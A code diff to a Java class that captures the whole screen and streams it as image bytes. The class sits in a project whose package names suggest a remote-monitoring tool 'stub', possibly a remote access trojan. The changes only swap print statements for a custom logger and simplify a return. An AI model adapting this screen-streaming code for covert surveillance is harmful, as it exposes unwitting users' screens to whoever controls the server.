@@ -2,6 +2,7 @@ package me.jershdervis.monitorj.stub.client.threads;
 
 import me.jershdervis.monitorj.stub.client.BaseClient;
 import me.jershdervis.monitorj.stub.client.Packets;
+import wiki.mtf.utils.FuckingPrintln;
 
 import javax.imageio.IIOImage;
 import javax.imageio.ImageIO;
@@ -63,7 +64,7 @@ public class RemoteDesktopStream implements Runnable {
                 break;
             }
         }
-        System.out.println("Stopped Remote Desktop Stream");
+        FuckingPrintln.out("Stopped Remote Desktop Stream");
     }
 
     private void sendBytes() throws IOException {
@@ -71,7 +72,7 @@ public class RemoteDesktopStream implements Runnable {
 
         byte[] array = encodeToByteArray(image);
 
-        System.out.println((array.length / 1024) + " kb");
+        FuckingPrintln.out((array.length / 1024) + " kb");
 
         dos.writeInt(array.length);
         dos.write(array);
@@ -100,7 +101,6 @@ public class RemoteDesktopStream implements Runnable {
 
     private BufferedImage getScreen(){
         Dimension size = Toolkit.getDefaultToolkit().getScreenSize();
-        BufferedImage bi = robot.createScreenCapture(new Rectangle(size));
-        return bi;
+        return robot.createScreenCapture(new Rectangle(size));
     }
 }
